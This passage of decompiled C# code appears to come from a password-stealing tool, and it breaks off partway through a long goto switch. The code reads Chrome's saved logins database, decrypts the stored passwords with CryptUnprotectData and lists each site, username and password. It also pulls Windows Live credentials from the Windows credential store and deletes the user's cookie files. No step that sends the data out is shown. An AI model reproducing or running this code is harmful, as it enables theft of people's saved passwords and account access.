						case 14:
							goto IL_00b1;
						case 15:
							goto IL_00cc;
						case 16:
							goto IL_00fb;
						case 17:
							goto IL_0106;
						case 18:
							goto IL_0112;
						case 19:
							goto IL_0125;
						case 20:
							goto IL_0137;
						case 21:
							goto IL_018e;
						case 10:
						case 11:
						case 22:
						case 23:
							goto IL_01a3;
						case 24:
							goto IL_01b3;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
						case 27:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_018e:
					num = 21;
					vmethod_0().set_Text(string_27);
					goto IL_01a3;
					IL_0137:
					num = 20;
					string_27 = string_27 + "-------------------------\r\nWebsite: " + text + "\r\nUsername: " + text2 + "\r\nPassword: " + text3 + "\r\n-------------------------\r\n";
					goto IL_018e;
					IL_0009:
					num = 2;
					text4 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
					goto IL_001e;
					IL_001e:
					num = 3;
					if (!File.Exists(text4))
					{
						goto end_IL_0000_3;
					}
					goto IL_002c;
					IL_002c:
					num = 4;
					val = new SQLiteConnection();
					goto IL_0036;
					IL_0036:
					num = 5;
					val.set_ConnectionString("Data Source=" + text4 + ";");
					goto IL_0050;
					IL_0050:
					num = 6;
					val.Open();
					goto IL_005a;
					IL_005a:
					num = 7;
					val2 = val.CreateCommand();
					goto IL_0065;
					IL_0065:
					num = 8;
					val2.set_CommandText("SELECT * FROM logins");
					goto IL_0073;
					IL_0073:
					num = 9;
					val3 = val2.ExecuteReader();
					goto IL_01a3;
					IL_01a3:
					num = 11;
					if (val3.Read())
					{
						goto IL_0084;
					}
					goto IL_01b3;
					IL_01b3:
					num = 24;
					((Component)(object)val2).Dispose();
					break;
					IL_0084:
					num = 12;
					text = Conversions.ToString(val3.get_Item("origin_url"));
					goto IL_009a;
					IL_009a:
					num = 13;
					text2 = Conversions.ToString(val3.get_Item("username_value"));
					goto IL_00b1;
					IL_00b1:
					num = 14;
					text3 = Decrypt((byte[])val3.get_Item("password_value"));
					goto IL_00cc;
					IL_00cc:
					num = 15;
					if ((Operators.CompareString(text2, string.Empty, false) != 0) & (Operators.CompareString(text3, string.Empty, false) != 0))
					{
						goto IL_00fb;
					}
					goto IL_01a3;
					IL_00fb:
					num = 16;
					val4 = new ListViewItem();
					goto IL_0106;
					IL_0106:
					num = 17;
					val4.set_Text(text);
					goto IL_0112;
					IL_0112:
					num = 18;
					val4.get_SubItems().Add(text2);
					goto IL_0125;
					IL_0125:
					num = 19;
					val4.get_SubItems().Add(text3);
					goto IL_0137;
					end_IL_0000_2:
					break;
				}
				num = 25;
				val.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 587;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct3 struct3_0, string string_29, ref int int_0, IntPtr intptr_0, ref GStruct0 gstruct0_0, int int_1, ref Struct3 struct3_1);

	public static string Decrypt(byte[] Datas)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		GStruct0 gStruct = default(GStruct0);
		IntPtr intptr_ = default(IntPtr);
		string text = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						Struct3 struct3_ = default(Struct3);
						Struct3 struct3_2 = default(Struct3);
						GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
						struct3_.intptr_1 = gCHandle.AddrOfPinnedObject();
						struct3_.intptr_0 = (IntPtr)Datas.Length;
						gCHandle.Free();
						int int_ = 0;
						GStruct0 gstruct0_ = gStruct;
						CryptUnprotectData(ref struct3_, null, ref int_, intptr_, ref gstruct0_, 0, ref struct3_2);
						byte[] array = new byte[(int)struct3_2.intptr_0 + 1];
						Marshal.Copy(struct3_2.intptr_1, array, 0, (int)struct3_2.intptr_0);
						string @string = Encoding.Default.GetString(array);
						text = @string.Substring(0, @string.Length - 1);
						break;
					}
					case 177:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_00eb;
						}
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 177;
				continue;
			}
			break;
			IL_00eb:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		string result = text;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CredEnumerate(string string_29, int int_0, ref int int_1, ref IntPtr intptr_0);

	public void MSN()
	{
		int int_ = 0;
		IntPtr intptr_ = IntPtr.Zero;
		IntPtr[] array = null;
		checked
		{
			if (CredEnumerate("WindowsLive:name=*", 0, ref int_, ref intptr_))
			{
				array = new IntPtr[int_ - 1 + 1];
				IntPtr ptr = intptr_;
				int num = int_ - 1;
				GStruct0 gStruct = default(GStruct0);
				for (int i = 0; i <= num; i++)
				{
					ref IntPtr reference = ref array[i];
					reference = Marshal.ReadIntPtr(ptr, IntPtr.Size * i);
					Struct2 @struct = (Struct2)Marshal.PtrToStructure(array[i], typeof(Struct2));
					Struct3 struct3_ = default(Struct3);
					Struct3 struct3_2 = default(Struct3);
					struct3_.intptr_1 = @struct.intptr_5;
					struct3_.intptr_0 = @struct.intptr_4;
					string string_ = Conversions.ToString(0);
					int int_2 = 0;
					IntPtr intptr_2 = (IntPtr)0;
					GStruct0 gstruct0_ = gStruct;
					CryptUnprotectData(ref struct3_, string_, ref int_2, intptr_2, ref gstruct0_, 1, ref struct3_2);
					RichTextBox val = vmethod_4();
					val.set_Text(val.get_Text() + "-------------------------\r\nUsername: " + Marshal.PtrToStringAuto(@struct.intptr_10) + "\r\nPassword: " + Marshal.PtrToStringAuto(struct3_.intptr_1) + "\r\n-------------------------\r\n");
				}
			}
		}
	}

	public string GetBetween(ref string strSource, ref string strStart, ref string strEnd, ref int startPos = default(int))
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		string text2 = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						int length = strStart.Length;
						string text = string.Empty;
						int num3 = strSource.IndexOf(strStart, startPos);
						int num4 = strSource.IndexOf(strEnd, num3 + length);
						if (num3 != -1 && num4 != -1)
						{
							text = strSource.Substring(num3 + length, num4 - (num3 + length));
						}
						text2 = text;
						break;
					}
					case 81:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_008b;
						}
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 81;
				continue;
			}
			break;
			IL_008b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		string result = text2;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public object ReadKey(ref string hKey)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		object obj;
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell", string.Empty));
					object[] array = new object[1] { hKey };
					bool[] array2 = new bool[1] { true };
					object obj2 = NewLateBinding.LateGet(objectValue, (Type)null, "regread", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						hKey = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					obj = RuntimeHelpers.GetObjectValue(obj2);
					goto end_IL_0000;
				}
				case 121:
					num = -1;
					switch (num2)
					{
					case 2:
						obj = null;
						goto end_IL_0000;
					}
					break;
				}
				goto IL_00b3;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 121;
				continue;
			}
			break;
			IL_00b3:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		object result = obj;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public string Hex2Ascii(string Text)
	{
		object obj = null;
		object obj2 = default(object);
		object obj3 = default(object);
		if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
		{
			do
			{
				object obj4 = Strings.Mid(Text, Conversions.ToInteger(obj2), 2);
				obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)"&h", obj4))))));
				obj2 = Operators.AddObject(obj2, (object)1);
			}
			while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
		}
		return Conversions.ToString(obj);
	}

	public string base64Decode(string data)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		string text2 = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					UTF8Encoding uTF8Encoding = new UTF8Encoding();
					Decoder decoder = uTF8Encoding.GetDecoder();
					byte[] array = Convert.FromBase64String(data);
					int charCount = decoder.GetCharCount(array, 0, array.Length);
					char[] array2 = new char[checked(charCount - 1 + 1)];
					decoder.GetChars(array, 0, array.Length, array2, 0);
					string text = new string(array2);
					text2 = text;
					break;
				}
				case 88:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0092;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 88;
				continue;
			}
			break;
			IL_0092:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		string result = text2;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void Cookies()
	{
		try
		{
			FileSystem.Kill(Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\*.*");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Key()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		string text14 = default(string);
		string text15 = default(string);
		string text16 = default(string);
		string text17 = default(string);
		string text18 = default(string);
		string text19 = default(string);
		string text20 = default(string);
		string text21 = default(string);
		string text22 = default(string);
		string text23 = default(string);
		string text24 = default(string);
		string text25 = default(string);
		string text26 = default(string);
		string text27 = default(string);
		string text28 = default(string);
		string text29 = default(string);
		string text30 = default(string);
		string text31 = default(string);
		string text32 = default(string);
		string text33 = default(string);
		string text34 = default(string);
		string text35 = default(string);
		string text36 = default(string);
		string text37 = default(string);
		string text38 = default(string);
		string text39 = default(string);
		string text40 = default(string);
		string text41 = default(string);
		string text42 = default(string);
		string text43 = default(string);
		string text44 = default(string);
		string text45 = default(string);
		string text46 = default(string);
		string text47 = default(string);
		string text48 = default(string);
		string text49 = default(string);
		string text50 = default(string);
		string text51 = default(string);
		string text52 = default(string);
		string text53 = default(string);
		string text54 = default(string);
		string text55 = default(string);
		string text56 = default(string);
		string text57 = default(string);
		string text58 = default(string);
		string text59 = default(string);
		string text60 = default(string);
		string text61 = default(string);
		string text62 = default(string);
		string text63 = default(string);
		string text64 = default(string);
		string text65 = default(string);
		string text66 = default(string);
		string text67 = default(string);
		string text68 = default(string);
		string text69 = default(string);
		string text70 = default(string);
		string text71 = default(string);
		string text72 = default(string);
		string text73 = default(string);
		string text74 = default(string);
		string text75 = default(string);
		string text76 = default(string);
		string text77 = default(string);
		string text78 = default(string);
		string text79 = default(string);
		string text80 = default(string);
		string text81 = default(string);
		string text82 = default(string);
		string text83 = default(string);
		string text84 = default(string);
		string text85 = default(string);
		string text86 = default(string);
		string text87 = default(string);
		string text88 = default(string);
		string text89 = default(string);
		string text90 = default(string);
		string text91 = default(string);
		string text92 = default(string);
		string text93 = default(string);
		string text94 = default(string);
		string text95 = default(string);
		string text96 = default(string);
		string text97 = default(string);
		string text98 = default(string);
		string text99 = default(string);
		string text100 = default(string);
		string text101 = default(string);
		string text102 = default(string);
		string text103 = default(string);
		string text104 = default(string);
		string text105 = default(string);
		string text106 = default(string);
		string text107 = default(string);
		string text108 = default(string);
		string text109 = default(string);
		string text110 = default(string);
		string text111 = default(string);
		string text112 = default(string);
		string text113 = default(string);
		string text114 = default(string);
		string text115 = default(string);
		string text116 = default(string);
		string text117 = default(string);
		string text118 = default(string);
		string text119 = default(string);
		string text120 = default(string);
		string text121 = default(string);
		string text122 = default(string);
		string text123 = default(string);
		string text124 = default(string);
		string text125 = default(string);
		string text126 = default(string);
		string text127 = default(string);
		string text128 = default(string);
		string text129 = default(string);
		string text130 = default(string);
		string text131 = default(string);
		string text132 = default(string);
		string text133 = default(string);
		string text134 = default(string);
		string text135 = default(string);
		string text136 = default(string);
		string text137 = default(string);
		string text138 = default(string);
		string text139 = default(string);
		string text140 = default(string);
		string text141 = default(string);
		string text142 = default(string);
		string text143 = default(string);
		string text144 = default(string);
		string text145 = default(string);
		string text146 = default(string);
		string text147 = default(string);
		string text148 = default(string);
		string text149 = default(string);
		string text150 = default(string);
		string text151 = default(string);
		string text152 = default(string);
		string text153 = default(string);
		string text154 = default(string);
		string text155 = default(string);
		string text156 = default(string);
		string text157 = default(string);
		string text158 = default(string);
		string text159 = default(string);
		string text160 = default(string);
		string text161 = default(string);
		string text162 = default(string);
		string text163 = default(string);
		string text164 = default(string);
		string text165 = default(string);
		string text166 = default(string);
		string text167 = default(string);
		string text168 = default(string);
		string text169 = default(string);
		string text170 = default(string);
		string text171 = default(string);
		string text172 = default(string);
		string text173 = default(string);
		string text174 = default(string);
		string text175 = default(string);
		string text176 = default(string);
		string text177 = default(string);
		string text178 = default(string);
		string text179 = default(string);
		string text180 = default(string);
		string text181 = default(string);
		string text182 = default(string);
		string text183 = default(string);
		string text184 = default(string);
		string text185 = default(string);
		string text186 = default(string);
		string text187 = default(string);
		string text188 = default(string);
		string text189 = default(string);
		string text190 = default(string);
		string text191 = default(string);
		string text192 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 26052:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0027;
						case 4:
							goto IL_0030;
						case 5:
							goto IL_004a;
						case 6:
							goto IL_0060;
						case 7:
							goto IL_006a;
						case 8:
							goto IL_0073;
						case 9:
							goto IL_008d;
						case 10:
							goto IL_00a4;
						case 11:
							goto IL_00b4;
						case 12:
							goto IL_00bf;
						case 13:
							goto IL_00c8;
						case 14:
							goto IL_00e2;
						case 15:
							goto IL_00f8;
						case 16:
							goto IL_0108;
						case 17:
							goto IL_0113;
						case 18:
							goto IL_011c;
						case 19:
							goto IL_0136;
						case 20:
							goto IL_014c;
						case 21:
							goto IL_0157;
						case 22:
							goto IL_0167;
						case 23:
							goto IL_0172;
						case 24:
							goto IL_017b;
						case 25:
							goto IL_0195;
						case 26:
							goto IL_01ab;
						case 27:
							goto IL_01b6;
						case 28:
							goto IL_01c6;
						case 29:
							goto IL_01d1;
						case 30:
							goto IL_01da;
						case 31:
							goto IL_01f5;
						case 32:
							goto IL_020c;
						case 33:
							goto IL_0217;
						case 34:
							goto IL_0227;
						case 35:
							goto IL_0232;
						case 36:
							goto IL_023b;
						case 37:
							goto IL_0256;
						case 38:
							goto IL_026d;
						case 39:
							goto IL_0278;
						case 40:
							goto IL_0288;
						case 41:
							goto IL_0293;
						case 42:
							goto IL_029c;
						case 43:
							goto IL_02b7;
						case 44:
							goto IL_02ce;
						case 45:
							goto IL_02d9;
						case 46:
							goto IL_02e9;
						case 47:
							goto IL_02f4;
						case 48:
							goto IL_02fd;
						case 49:
							goto IL_0317;
						case 50:
							goto IL_032d;
						case 51:
							goto IL_033d;
						case 52:
							goto IL_0348;
						case 53:
							goto IL_0351;
						case 54:
							goto IL_036c;
						case 55:
							goto IL_0383;
						case 56:
							goto IL_038e;
						case 57:
							goto IL_039e;
						case 58:
							goto IL_03a9;
						case 59:
							goto IL_03b2;
						case 60:
							goto IL_03cd;
						case 61:
							goto IL_03e4;
						case 62:
							goto IL_03ef;
						case 63:
							goto IL_03ff;
						case 64:
							goto IL_040a;
						case 65:
							goto IL_0413;
						case 66:
							goto IL_042e;
						case 67:
							goto IL_0445;
						case 68:
							goto IL_0450;
						case 69:
							goto IL_0460;
						case 70:
							goto IL_046b;
						case 71:
							goto IL_0474;
						case 72:
							goto IL_048f;
						case 73:
							goto IL_04a6;
						case 74:
							goto IL_04b1;
						case 75:
							goto IL_04c1;
						case 76:
							goto IL_04cc;
						case 77:
							goto IL_04d5;
						case 78:
							goto IL_04f0;
						case 79:
							goto IL_0507;
						case 80:
							goto IL_0512;
						case 81:
							goto IL_0522;
						case 82:
							goto IL_052d;
						case 83:
							goto IL_0536;
						case 84:
							goto IL_0551;
						case 85:
							goto IL_0568;
						case 86:
							goto IL_0573;
						case 87:
							goto IL_0583;
						case 88:
							goto IL_058e;
						case 89:
							goto IL_0597;
						case 90:
							goto IL_05b2;
						case 91:
							goto IL_05c9;
						case 92:
							goto IL_05d4;
						case 93:
							goto IL_05e4;
						case 94:
							goto IL_05ef;
						case 95:
							goto IL_05f8;
						case 96:
							goto IL_0613;
						case 97:
							goto IL_062a;
						case 98:
							goto IL_0635;
						case 99:
							goto IL_0645;
						case 100:
							goto IL_0650;
						case 101:
							goto IL_0659;
						case 102:
							goto IL_0674;
						case 103:
							goto IL_068b;
						case 104:
							goto IL_0696;
						case 105:
							goto IL_06a6;
						case 106:
							goto IL_06b1;
						case 107:
							goto IL_06ba;
						case 108:
							goto IL_06d5;
						case 109:
							goto IL_06ec;
						case 110:
							goto IL_06f7;
						case 111:
							goto IL_0707;
						case 112:
							goto IL_0712;
						case 113:
							goto IL_071b;
						case 114:
							goto IL_0736;
						case 115:
							goto IL_074d;
						case 116:
							goto IL_0758;
						case 117:
							goto IL_0768;
						case 118:
							goto IL_0773;
						case 119:
							goto IL_077c;
						case 120:
							goto IL_0797;
						case 121:
							goto IL_07ae;
						case 122:
							goto IL_07b9;
						case 123:
							goto IL_07c9;
						case 124:
							goto IL_07d4;
						case 125:
							goto IL_07dd;
						case 126:
							goto IL_07f8;
						case 127:
							goto IL_080f;
						case 128:
							goto IL_081a;
						case 129:
							goto IL_082d;
						case 130:
							goto IL_083b;
						case 131:
							goto IL_0844;
						case 132:
							goto IL_0862;
						case 133:
							goto IL_087c;
						case 134:
							goto IL_088a;
						case 135:
							goto IL_089d;
						case 136:
							goto IL_08ab;
						case 137:
							goto IL_08b4;
						case 138:
							goto IL_08d2;
						case 139:
							goto IL_08ec;
						case 140:
							goto IL_08fa;
						case 141:
							goto IL_090d;
						case 142:
							goto IL_091b;
						case 143:
							goto IL_0924;
						case 144:
							goto IL_0942;
						case 145:
							goto IL_095c;
						case 146:
							goto IL_096a;
						case 147:
							goto IL_097d;
						case 148:
							goto IL_098b;
						case 149:
							goto IL_0994;
						case 150:
							goto IL_09b2;
						case 151:
							goto IL_09cc;
						case 152:
							goto IL_09da;
						case 153:
							goto IL_09ed;
						case 154:
							goto IL_09fb;
						case 155:
							goto IL_0a04;
						case 156:
							goto IL_0a22;
						case 157:
							goto IL_0a3c;
						case 158:
							goto IL_0a4a;
						case 159:
							goto IL_0a5d;
						case 160:
							goto IL_0a6b;
						case 161:
							goto IL_0a74;
						case 162:
							goto IL_0a92;
						case 163:
							goto IL_0aac;
						case 164:
							goto IL_0aba;
						case 165:
							goto IL_0acd;
						case 166:
							goto IL_0adb;
						case 167:
							goto IL_0ae4;
						case 168:
							goto IL_0b02;
						case 169:
							goto IL_0b1c;
						case 170:
							goto IL_0b2a;
						case 171:
							goto IL_0b3d;
						case 172:
							goto IL_0b4b;
						case 173:
							goto IL_0b54;
						case 174:
							goto IL_0b72;
						case 175:
							goto IL_0b8c;
						case 176:
							goto IL_0b9a;
						case 177:
							goto IL_0bad;
						case 178:
							goto IL_0bbb;
						case 179:
							goto IL_0bc4;
						case 180:
							goto IL_0be2;
						case 181:
							goto IL_0bfc;
						case 182:
							goto IL_0c0a;
						case 183:
							goto IL_0c1d;
						case 184:
							goto IL_0c2b;
						case 185:
							goto IL_0c34;
						case 186:
							goto IL_0c52;
						case 187:
							goto IL_0c6c;
						case 188:
							goto IL_0c7a;
						case 189:
							goto IL_0c8d;
						case 190:
							goto IL_0c9b;
						case 191:
							goto IL_0ca4;
						case 192:
							goto IL_0cc2;
						case 193:
							goto IL_0cdc;
						case 194:
							goto IL_0cea;
						case 195:
							goto IL_0cfd;
						case 196:
							goto IL_0d0b;
						case 197:
							goto IL_0d14;
						case 198:
							goto IL_0d32;
						case 199:
							goto IL_0d4c;
						case 200:
							goto IL_0d5a;
						case 201:
							goto IL_0d6d;
						case 202:
							goto IL_0d7b;
						case 203:
							goto IL_0d84;
						case 204:
							goto IL_0da2;
						case 205:
							goto IL_0dbc;
						case 206:
							goto IL_0dca;
						case 207:
							goto IL_0ddd;
						case 208:
							goto IL_0deb;
						case 209:
							goto IL_0df4;
						case 210:
							goto IL_0e12;
						case 211:
							goto IL_0e2c;
						case 212:
							goto IL_0e3a;
						case 213:
							goto IL_0e4d;
						case 214:
							goto IL_0e5b;
						case 215:
							goto IL_0e64;
						case 216:
							goto IL_0e82;
						case 217:
							goto IL_0e9c;
						case 218:
							goto IL_0eaa;
						case 219:
							goto IL_0ebd;
						case 220:
							goto IL_0ecb;
						case 221:
							goto IL_0ed4;
						case 222:
							goto IL_0ef2;
						case 223:
							goto IL_0f0c;
						case 224:
							goto IL_0f1a;
						case 225:
							goto IL_0f2d;
						case 226:
							goto IL_0f3b;
						case 227:
							goto IL_0f44;
						case 228:
							goto IL_0f62;
						case 229:
							goto IL_0f7c;
						case 230:
							goto IL_0f8a;
						case 231:
							goto IL_0f9d;
						case 232:
							goto IL_0fab;
						case 233:
							goto IL_0fb4;
						case 234:
							goto IL_0fd2;
						case 235:
							goto IL_0fec;
						case 236:
							goto IL_0ffa;
						case 237:
							goto IL_100d;
						case 238:
							goto IL_101b;
						case 239:
							goto IL_1024;
						case 240:
							goto IL_1042;
						case 241:
							goto IL_105c;
						case 242:
							goto IL_106a;
						case 243:
							goto IL_107d;
						case 244:
							goto IL_108b;
						case 245:
							goto IL_1094;
						case 246:
							goto IL_10b2;
						case 247:
							goto IL_10cc;
						case 248:
							goto IL_10da;
						case 249:
							goto IL_10ed;
						case 250:
							goto IL_10fb;
						case 251:
							goto IL_1104;
						case 252:
							goto IL_1122;
						case 253:
							goto IL_113c;
						case 254:
							goto IL_114a;
						case 255:
							goto IL_115d;
						case 256:
							goto IL_116b;
						case 257:
							goto IL_1174;
						case 258:
							goto IL_1192;
						case 259:
							goto IL_11ac;
						case 260:
							goto IL_11ba;
						case 261:
							goto IL_11cd;
						case 262:
							goto IL_11db;
						case 263:
							goto IL_11e4;
						case 264:
							goto IL_1202;
						case 265:
							goto IL_121c;
						case 266:
							goto IL_122a;
						case 267:
							goto IL_123d;
						case 268:
							goto IL_124b;
						case 269:
							goto IL_1254;
						case 270:
							goto IL_1272;
						case 271:
							goto IL_128c;
						case 272:
							goto IL_129a;
						case 273:
							goto IL_12ad;
						case 274:
							goto IL_12bb;
						case 275:
							goto IL_12c4;
						case 276:
							goto IL_12e2;
						case 277:
							goto IL_12fc;
						case 278:
							goto IL_130a;
						case 279:
							goto IL_131d;
						case 280:
							goto IL_132b;
						case 281:
							goto IL_1334;
						case 282:
							goto IL_1352;
						case 283:
							goto IL_136c;
						case 284:
							goto IL_137a;
						case 285:
							goto IL_138d;
						case 286:
							goto IL_139b;
						case 287:
							goto IL_13a4;
						case 288:
							goto IL_13c2;
						case 289:
							goto IL_13dc;
						case 290:
							goto IL_13ea;
						case 291:
							goto IL_13fd;
						case 292:
							goto IL_140b;
						case 293:
							goto IL_1414;
						case 294:
							goto IL_1432;
						case 295:
							goto IL_144c;
						case 296:
							goto IL_145a;
						case 297:
							goto IL_146d;
						case 298:
							goto IL_147b;
						case 299:
							goto IL_1484;
						case 300:
							goto IL_14a2;
						case 301:
							goto IL_14bc;
						case 302:
							goto IL_14ca;
						case 303:
							goto IL_14dd;
						case 304:
							goto IL_14eb;
						case 305:
							goto IL_14f4;
						case 306:
							goto IL_1512;
						case 307:
							goto IL_152c;
						case 308:
							goto IL_153a;
						case 309:
							goto IL_154d;
						case 310:
							goto IL_155b;
						case 311:
							goto IL_1564;
						case 312:
							goto IL_1582;
						case 313:
							goto IL_159c;
						case 314:
							goto IL_15aa;
						case 315:
							goto IL_15bd;
						case 316:
							goto IL_15cb;
						case 317:
							goto IL_15d4;
						case 318:
							goto IL_15f2;
						case 319:
							goto IL_160c;
						case 320:
							goto IL_161a;
						case 321:
							goto IL_162d;
						case 322:
							goto IL_163b;
						case 323:
							goto IL_1644;
						case 324:
							goto IL_1662;
						case 325:
							goto IL_167c;
						case 326:
							goto IL_168a;
						case 327:
							goto IL_169d;
						case 328:
							goto IL_16ab;
						case 329:
							goto IL_16b4;
						case 330:
							goto IL_16d2;
						case 331:
							goto IL_16ec;
						case 332:
							goto IL_16fa;
						case 333:
							goto IL_170d;
						case 334:
							goto IL_171b;
						case 335:
							goto IL_1724;
						case 336:
							goto IL_1742;
						case 337:
							goto IL_175c;
						case 338:
							goto IL_176a;
						case 339:
							goto IL_177d;
						case 340:
							goto IL_178b;
						case 341:
							goto IL_1794;
						case 342:
							goto IL_17b2;
						case 343:
							goto IL_17cc;
						case 344:
							goto IL_17da;
						case 345:
							goto IL_17ed;
						case 346:
							goto IL_17fb;
						case 347:
							goto IL_1804;
						case 348:
							goto IL_1822;
						case 349:
							goto IL_183c;
						case 350:
							goto IL_184a;
						case 351:
							goto IL_185d;
						case 352:
							goto IL_186b;
						case 353:
							goto IL_1874;
						case 354:
							goto IL_1892;
						case 355:
							goto IL_18ac;
						case 356:
							goto IL_18ba;
						case 357:
							goto IL_18cd;
						case 358:
							goto IL_18db;
						case 359:
							goto IL_18e4;
						case 360:
							goto IL_1902;
						case 361:
							goto IL_191c;
						case 362:
							goto IL_192a;
						case 363:
							goto IL_193d;
						case 364:
							goto IL_194b;
						case 365:
							goto IL_1954;
						case 366:
							goto IL_1972;
						case 367:
							goto IL_198c;
						case 368:
							goto IL_199a;
						case 369:
							goto IL_19ad;
						case 370:
							goto IL_19bb;
						case 371:
							goto IL_19c4;
						case 372:
							goto IL_19e2;
						case 373:
							goto IL_19fc;
						case 374:
							goto IL_1a0a;
						case 375:
							goto IL_1a1d;
						case 376:
							goto IL_1a2b;
						case 377:
							goto IL_1a34;
						case 378:
							goto IL_1a52;
						case 379:
							goto IL_1a6c;
						case 380:
							goto IL_1a7a;
						case 381:
							goto IL_1a8d;
						case 382:
							goto IL_1a9b;
						case 383:
							goto IL_1aa4;
						case 384:
							goto IL_1ac2;
						case 385:
							goto IL_1adc;
						case 386:
							goto IL_1aea;
						case 387:
							goto IL_1afd;
						case 388:
							goto IL_1b0b;
						case 389:
							goto IL_1b14;
						case 390:
							goto IL_1b32;
						case 391:
							goto IL_1b4c;
						case 392:
							goto IL_1b5a;
						case 393:
							goto IL_1b6d;
						case 394:
							goto IL_1b7b;
						case 395:
							goto IL_1b84;
						case 396:
							goto IL_1ba2;
						case 397:
							goto IL_1bbc;
						case 398:
							goto IL_1bca;
						case 399:
							goto IL_1bdd;
						case 400:
							goto IL_1beb;
						case 401:
							goto IL_1bf4;
						case 402:
							goto IL_1c12;
						case 403:
							goto IL_1c2c;
						case 404:
							goto IL_1c3a;
						case 405:
							goto IL_1c4d;
						case 406:
							goto IL_1c5b;
						case 407:
							goto IL_1c64;
						case 408:
							goto IL_1c82;
						case 409:
							goto IL_1c9c;
						case 410:
							goto IL_1caa;
						case 411:
							goto IL_1cbd;
						case 412:
							goto IL_1ccb;
						case 413:
							goto IL_1cd4;
						case 414:
							goto IL_1cf2;
						case 415:
							goto IL_1d0c;
						case 416:
							goto IL_1d1a;
						case 417:
							goto IL_1d2d;
						case 418:
							goto IL_1d3b;
						case 419:
							goto IL_1d44;
						case 420:
							goto IL_1d62;
						case 421:
							goto IL_1d7c;
						case 422:
							goto IL_1d8a;
						case 423:
							goto IL_1d9d;
						case 424:
							goto IL_1dab;
						case 425:
							goto IL_1db4;
						case 426:
